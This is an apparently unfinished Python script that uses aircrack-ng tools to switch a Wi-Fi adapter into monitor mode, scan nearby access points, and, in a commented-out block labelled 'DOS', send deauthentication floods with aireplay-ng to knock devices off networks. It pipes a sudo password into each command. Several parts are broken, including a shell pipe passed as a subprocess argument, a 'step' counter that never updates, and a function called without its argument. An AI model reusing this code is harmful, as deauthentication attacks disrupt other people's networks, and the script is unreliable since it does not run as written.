import subprocess
import os
import re
from dotenv import load_dotenv
load_dotenv()
import csv


# Find the default adapter
def get_default_adapter():
    try:
        output = (subprocess.check_output(['ip', 'route', 'show', 'default']).split())[4].decode()
        return output if output else "Default route not found"

    except subprocess.CalledProcessError as e:
        return f"Error: {e}"


# Get MACs of adapters connected to device
def get_adapter_macs():
    try:
        result = subprocess.run(['ip', 'link'], capture_output=True, text=True)
        output_lines = result.stdout.split('\n')
        mac_addresses = []

        for line in output_lines:
            if 'link/ether' in line:
                parts = line.strip().split()
                mac_address = parts[1]
                mac_addresses.append(mac_address)

        return mac_addresses
    except Exception as e:
        print(f"Error occurred: {e}")
        return None
    


# Stop monitor mode
def stop_monitor(adapterMonitor):
    subprocess.run(["sudo", "airmon-ng", "stop", adapterMonitor], input=f"{sudoPass}\n", check=True, text=True)
    print("Free")

# Start Services
def start_services():
    subprocess.run(["sudo", "service", "NetworkManager", "start"], input=f"{sudoPass}\n", check=True, text=True)
    subprocess.run(["sudo", "service", "wpa_supplicant", "start"], input=f"{sudoPass}\n", check=True, text=True)


# Get BSSIDs of nearby networks
def get_bssids(adapter, adapterMonitor):
    try:
        # Kill interfering processes
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], input=f"{sudoPass}\n", check=True, text=True)
        step = 1

        # Put adapter into monitor mode
        subprocess.run(["sudo", "airmon-ng", "start", adapter], input=f"{sudoPass}\n", check=True, text=True)
        step = 2
  
        # Start the adapter
        subprocess.run(["sudo", "airmon-ng", "start", adapterMonitor], input=f"{sudoPass}\n", check=True, text=True)
        step = 3

        # Get BSSIDs of nearby devices
        # output = subprocess.run(['sudo', 'timeout', '10', 'airodump-ng', adapterMonitor], input=f"{sudoPass}\n", universal_newlines=True , text=True)
        # print(output)
        # bssids = re.findall(r'(?:[0-9A-Fa-f]:?){12}', output)

        command = ['sudo', 'timeout', '10', 'airodump-ng', adapterMonitor, '--output-format', 'csv', '|', 'awk', '{print $1}']
        output = subprocess.run(command, input=f"{sudoPass}", text=True)
        print("HERE")
        print(output.stdout)
        print("HERE")

        return output
    except subprocess.CalledProcessError as e:
        print("Command execution failed:", e)
        stop_monitor(adapterMonitor)
        start_services()
        return []


# # DOS
# time = '60'
# ap1 = mac_addresses[0]
# ath0 = 'wlan0'
# for bssid in bssid_list:
#     result = subprocess.run(['timeout', time, 'aireplay-ng', '--deauth', '0', '-a', ap1, '-c', bssid, ath0])

################
# MAIN PROGRAM #
################

# Get sudo password
sudoPass = os.environ['SUDO_PASSWORD']

# Find default adapter
adapter = get_default_adapter()

# Get and print MAC addresses of connected devices
mac_addresses = get_adapter_macs()
if mac_addresses:
    print("MAC addresses of connected devices:")
    print(mac_addresses)
else:
    print("Failed to retrieve MAC addresses.")

# Get the BSSIDs of nearby devices
step = 0
bssid_list = get_bssids(adapter, adapter + 'mon')
if step >= 1:
    start_services()
if step >= 2:
    stop_monitor()

print("List of BSSIDs:")
print(bssid_list)
